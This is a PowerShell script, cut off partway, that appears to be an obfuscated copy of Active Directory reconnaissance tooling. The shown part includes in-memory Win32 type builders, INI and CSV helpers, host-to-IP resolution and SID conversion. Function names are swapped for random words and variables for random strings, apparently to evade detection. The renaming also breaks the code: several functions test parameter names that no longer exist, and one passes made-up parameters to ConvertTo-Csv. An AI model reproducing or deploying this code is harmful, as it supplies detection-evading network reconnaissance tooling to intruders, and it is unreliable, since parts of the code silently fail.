function cunning {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $PjAzHFJI99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $AuOLXGcN99 = $PjAzHFJI99.GetAssemblies()
    foreach ($srzSxvHB99 in $AuOLXGcN99) {
        if ($srzSxvHB99.FullName -and ($srzSxvHB99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $srzSxvHB99
        }
    }
    $DMnAaCvO99 = New-Object Reflection.AssemblyName($ModuleName)
    $CmuysoGL99 = $PjAzHFJI99
    $uLnsulnW99 = $CmuysoGL99.DefineDynamicAssembly($DMnAaCvO99, 'Run')
    $TtWpWVtS99 = $uLnsulnW99.DefineDynamicModule($ModuleName, $False)
    return $TtWpWVtS99
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $QuJsjtFG99,
        [Switch]
        $SetLastError
    )
    $IzcJvFdA99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $IzcJvFdA99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $IzcJvFdA99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $IzcJvFdA99['Charset'] = $Charset }
    if ($SetLastError) { $IzcJvFdA99['SetLastError'] = $SetLastError }
    if ($QuJsjtFG99) { $IzcJvFdA99['EntryPoint'] = $QuJsjtFG99 }
    New-Object PSObject -Property $IzcJvFdA99
}
function Luvs
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $QuJsjtFG99,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $WJrzCPHK99 = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $WJrzCPHK99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $WJrzCPHK99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$WJrzCPHK99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $WJrzCPHK99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $WJrzCPHK99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $nFyaxSAK99 = $WJrzCPHK99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($WPPnNbko99 in $ParameterTypes)
            {
                if ($WPPnNbko99.IsByRef)
                {
                    [void] $nFyaxSAK99.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $StgVhclf99 = [Runtime.InteropServices.DllImportAttribute]
            $epecNzyW99 = $StgVhclf99.GetField('SetLastError')
            $lXRMdAlx99 = $StgVhclf99.GetField('CallingConvention')
            $szpoNxnh99 = $StgVhclf99.GetField('CharSet')
            $ByaZvPWt99 = $StgVhclf99.GetField('EntryPoint')
            if ($SetLastError) { $ldetRWzt99 = $True } else { $ldetRWzt99 = $False }
            if ($PSBoundParameters['EntryPoint']) { $ViHdAmvO99 = $QuJsjtFG99 } else { $ViHdAmvO99 = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $sxlpKcvN99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($epecNzyW99,
                                           $lXRMdAlx99,
                                           $szpoNxnh99,
                                           $ByaZvPWt99),
                [Object[]] @($ldetRWzt99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ViHdAmvO99))
            $nFyaxSAK99.SetCustomAttribute($sxlpKcvN99)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $WJrzCPHK99
        }
        $MLLRNzuV99 = @{}
        foreach ($Key in $WJrzCPHK99.Keys)
        {
            $Type = $WJrzCPHK99[$Key].CreateType()
            $MLLRNzuV99[$Key] = $Type
        }
        return $MLLRNzuV99
    }
}
function cox {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $QEFBvqXE99,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $dGmUfJHU99,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($QEFBvqXE99))
    }
    $ArknIQaw99 = $Type -as [Type]
    $jzZitiOo99 = $Module.DefineEnum($QEFBvqXE99, 'Public', $ArknIQaw99)
    if ($Bitfield)
    {
        $eLCvwfop99 = [FlagsAttribute].GetConstructor(@())
        $YgUfezCv99 = New-Object Reflection.Emit.CustomAttributeBuilder($eLCvwfop99, @())
        $jzZitiOo99.SetCustomAttribute($YgUfezCv99)
    }
    foreach ($Key in $dGmUfJHU99.Keys)
    {
        $null = $jzZitiOo99.DefineLiteral($Key, $dGmUfJHU99[$Key] -as $ArknIQaw99)
    }
    $jzZitiOo99.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $OdDefozg99,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $xPNHlFSC99,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $OdDefozg99
        Type = $Type -as [Type]
        Offset = $xPNHlFSC99
        MarshalAs = $MarshalAs
    }
}
function ump
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $QEFBvqXE99,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $ZjsEOWdk99,
        [Reflection.Emit.PackingSize]
        $VtduZzjw99 = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $bFkzkdtZ99
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($QEFBvqXE99))
    }
    [Reflection.TypeAttributes] $dSALGJUy99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($bFkzkdtZ99)
    {
        $dSALGJUy99 = $dSALGJUy99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $dSALGJUy99 = $dSALGJUy99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $xCULNOoa99 = $Module.DefineType($QEFBvqXE99, $dSALGJUy99, [ValueType], $VtduZzjw99)
    $cUzzwmYl99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $hQYmehLS99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $ROhUAqYI99 = New-Object Hashtable[]($ZjsEOWdk99.Count)
    foreach ($Field in $ZjsEOWdk99.Keys)
    {
        $Index = $ZjsEOWdk99[$Field]['Position']
        $ROhUAqYI99[$Index] = @{FieldName = $Field; Properties = $ZjsEOWdk99[$Field]}
    }
    foreach ($Field in $ROhUAqYI99)
    {
        $TGPNKMKd99 = $Field['FieldName']
        $MlHoDmDv99 = $Field['Properties']
        $xPNHlFSC99 = $MlHoDmDv99['Offset']
        $Type = $MlHoDmDv99['Type']
        $MarshalAs = $MlHoDmDv99['MarshalAs']
        $LYugrpPi99 = $xCULNOoa99.DefineField($TGPNKMKd99, $Type, 'Public')
        if ($MarshalAs)
        {
            $QBmVxsok99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $isxTtKUj99 = New-Object Reflection.Emit.CustomAttributeBuilder($cUzzwmYl99,
                    $QBmVxsok99, $hQYmehLS99, @($Size))
            }
            else
            {
                $isxTtKUj99 = New-Object Reflection.Emit.CustomAttributeBuilder($cUzzwmYl99, [Object[]] @($QBmVxsok99))
            }
            $LYugrpPi99.SetCustomAttribute($isxTtKUj99)
        }
        if ($bFkzkdtZ99) { $LYugrpPi99.SetOffset($xPNHlFSC99) }
    }
    $mpdxNkVH99 = $xCULNOoa99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $jlIUdXmt99 = $mpdxNkVH99.GetILGenerator()
    $jlIUdXmt99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $xCULNOoa99)
    $jlIUdXmt99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $jlIUdXmt99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $jlIUdXmt99.Emit([Reflection.Emit.OpCodes]::Ret)
    $KePLvQNc99 = $xCULNOoa99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $xCULNOoa99,
        [Type[]] @([IntPtr]))
    $FdCJeCIy99 = $KePLvQNc99.GetILGenerator()
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Nop)
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $xCULNOoa99)
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $xCULNOoa99)
    $FdCJeCIy99.Emit([Reflection.Emit.OpCodes]::Ret)
    $xCULNOoa99.CreateType()
}
Function enchantresses {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DMDVPxrU99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$OdDefozg99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$qZQxMLDl99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$RXTzbSFY99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$KgKBHBIO99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$VsTpOrfS99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$jvvNpcJV99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$wTUiFVTk99 = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$yEZAYZHC99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$qgsCbCUQ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$cgwwrheo99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$cLmBwNOk99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$yCsWifZv99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ZEXZFIEZ99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$NpPSAIXO99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$lQHzeLIP99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$AMTIrHct99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$FbAYOpfp99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$CgJHCaCU99,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $JfiZMrrf99 = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$GTbnmZHU99,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $BoSaCifq99
    )
    Begin {
        $zxYewMZx99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $hhlSaAWi99 = (Get-Command _temp).Parameters.Keys
    }
    Process {
        if($GTbnmZHU99) {
            $BMcZPwCg99 = $BoSaCifq99.Keys | Where-Object { $hhlSaAWi99 -notcontains $_ }
            ForEach($WPPnNbko99 in $BMcZPwCg99) {
                if ($WPPnNbko99) {
                    Set-Variable -Name $WPPnNbko99 -Value $BoSaCifq99.$WPPnNbko99 -Scope 1 -Force
                }
            }
        }
        else {
            $hdEuaMcg99 = @()
            $hdEuaMcg99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($hdEuaMcg99) {
                $hdEuaMcg99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }
            $GBOngzmQ99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }
            $tmp = $null
            ForEach ($WPPnNbko99 in $GBOngzmQ99) {
                $vmVPQPIy99 = Get-Variable -Name $WPPnNbko99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($WPPnNbko99, [ref]$tmp) -and $vmVPQPIy99) {
                    $PSBoundParameters.$WPPnNbko99 = $vmVPQPIy99
                }
            }
            if($JfiZMrrf99) {
                $splpljZG99 = $JfiZMrrf99
            }
            else {
                $splpljZG99 = $zxYewMZx99
            }
            $bpIipXIp99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
            $LoViECSp99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $iWuqBHDu99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $wAbTVSps99 = '^Alias$'
            $OiuGiReS99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                $LoViECSp99 {
                    Try {
                        $OiuGiReS99.$_ = . $bpIipXIp99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if($splpljZG99.Keys -contains $Name) {
                $splpljZG99.$Name.Attributes.Add($OiuGiReS99)
            }
            else {
                $QcoLZKXQ99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $iWuqBHDu99 {
                        Try {
                            $suUNhZJO99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $bpIipXIp99) -ErrorAction Stop
                            $QcoLZKXQ99.Add($suUNhZJO99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $wAbTVSps99 {
                        Try {
                            $nHQYuFDD99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $bpIipXIp99) -ErrorAction Stop
                            $QcoLZKXQ99.Add($nHQYuFDD99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $QcoLZKXQ99.Add($OiuGiReS99)
                $WPPnNbko99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $QcoLZKXQ99)
                $splpljZG99.Add($Name, $WPPnNbko99)
            }
        }
    }
    End {
        if(!$GTbnmZHU99 -and !$JfiZMrrf99) {
            $splpljZG99
        }
    }
}
function sprucing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Tcxfhgpw99
    )
    BEGIN {
        $wOegLMVb99 = @{}
    }
    PROCESS {
        ForEach ($ksjaRAXe99 in $Path) {
            if (($ksjaRAXe99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $UepKaYkI99 = (New-Object System.Uri($ksjaRAXe99)).Host
                if (-not $wOegLMVb99[$UepKaYkI99]) {
                    hepper -iEYVPYCX99 $UepKaYkI99 -QWHERWHL99 $QWHERWHL99
                    $wOegLMVb99[$UepKaYkI99] = $True
                }
            }
            if (Test-Path -Path $ksjaRAXe99) {
                if ($PSBoundParameters['OutputObject']) {
                    $wXXRQwSH99 = New-Object PSObject
                }
                else {
                    $wXXRQwSH99 = @{}
                }
                Switch -Regex -File $ksjaRAXe99 {
                    "^\[(.+)\]" # Section
                    {
                        $NrGRFEIO99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $NrGRFEIO99 = $NrGRFEIO99.Replace(' ', '')
                            $EtgUJJIt99 = New-Object PSObject
                            $wXXRQwSH99 | Add-Member Noteproperty $NrGRFEIO99 $EtgUJJIt99
                        }
                        else {
                            $wXXRQwSH99[$NrGRFEIO99] = @{}
                        }
                        $kdscohsX99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $kdscohsX99 = $kdscohsX99 + 1
                        $Name = 'Comment' + $kdscohsX99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $wXXRQwSH99.$NrGRFEIO99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $wXXRQwSH99[$NrGRFEIO99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $DknBxtOz99 = $Value.split(',') | ForEach-Object { $_.Trim() }
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $wXXRQwSH99.$NrGRFEIO99 | Add-Member Noteproperty $Name $DknBxtOz99
                        }
                        else {
                            $wXXRQwSH99[$NrGRFEIO99][$Name] = $DknBxtOz99
                        }
                    }
                }
                $wXXRQwSH99
            }
        }
    }
    END {
        $wOegLMVb99.Keys | grand
    }
}
function cretin {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $ZdbBtSMI99,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $MUUYrQgs99 = ',',
        [Switch]
        $FhmDyrmR99
    )
    BEGIN {
        $dxXcomOV99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $PuLarXTT99 = [System.IO.File]::Exists($dxXcomOV99)
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()
        if ($PSBoundParameters['Append']) {
            $swTiJsCh99 = [System.IO.FileMode]::Append
        }
        else {
            $swTiJsCh99 = [System.IO.FileMode]::Create
            $PuLarXTT99 = $False
        }
        $UhZiDxNx99 = New-Object IO.FileStream($dxXcomOV99, $swTiJsCh99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $IDDJclGS99 = New-Object System.IO.StreamWriter($UhZiDxNx99)
        $IDDJclGS99.AutoFlush = $True
    }
    PROCESS {
        ForEach ($Entry in $ZdbBtSMI99) {
            $oCNlezZQ99 = ConvertTo-Csv -ZdbBtSMI99 $Entry -MUUYrQgs99 $MUUYrQgs99 -NoTypeInformation
            if (-not $PuLarXTT99) {
                $oCNlezZQ99 | ForEach-Object { $IDDJclGS99.WriteLine($_) }
                $PuLarXTT99 = $True
            }
            else {
                $oCNlezZQ99[1..($oCNlezZQ99.Length-1)] | ForEach-Object { $IDDJclGS99.WriteLine($_) }
            }
        }
    }
    END {
        $Mutex.ReleaseMutex()
        $IDDJclGS99.Dispose()
        $UhZiDxNx99.Dispose()
    }
}
function readjust {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = $Env:COMPUTERNAME
    )
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            try {
                @(([Net.Dns]::GetHostEntry($UEyZXQpH99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[readjust] Could not resolve $UEyZXQpH99 to an IP Address."
            }
        }
    }
}
function Moroccans {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $PEicaWON99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $aHYsXQMf99 = @{}
        if ($PSBoundParameters['Domain']) { $aHYsXQMf99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $aHYsXQMf99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Credential']) { $aHYsXQMf99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        ForEach ($Object in $PEicaWON99) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters['Credential']) {
                $DN = upbraids -NADQIykH99 $Object -ZMAhChio99 'DN' @DomainSearcherArguments
                if ($DN) {
                    $wvZHbMee99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $TEQSWNGN99 = $DN.Split(',')[0].split('=')[1]
                    $aHYsXQMf99['Identity'] = $TEQSWNGN99
                    $aHYsXQMf99['Domain'] = $wvZHbMee99
                    $aHYsXQMf99['Properties'] = 'objectsid'
                    monologue @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $CmuysoGL99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $aHYsXQMf99 = @{}
                        $CmuysoGL99 = (rompers @DomainSearcherArguments).Name
                    }
                    $Obj = (New-Object System.Security.Principal.NTAccount($CmuysoGL99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[Moroccans] Error converting $CmuysoGL99\$Object : $_"
                }
            }
        }
    }
}
function vileness {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $JsKvOOQh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $YGZtXoSJ99 = @{}
        if ($PSBoundParameters['Domain']) { $YGZtXoSJ99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $YGZtXoSJ99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Credential']) { $YGZtXoSJ99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        ForEach ($vwZZtFNK99 in $JsKvOOQh99) {
            $vwZZtFNK99 = $vwZZtFNK99.trim('*')
            try {
                Switch ($vwZZtFNK99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
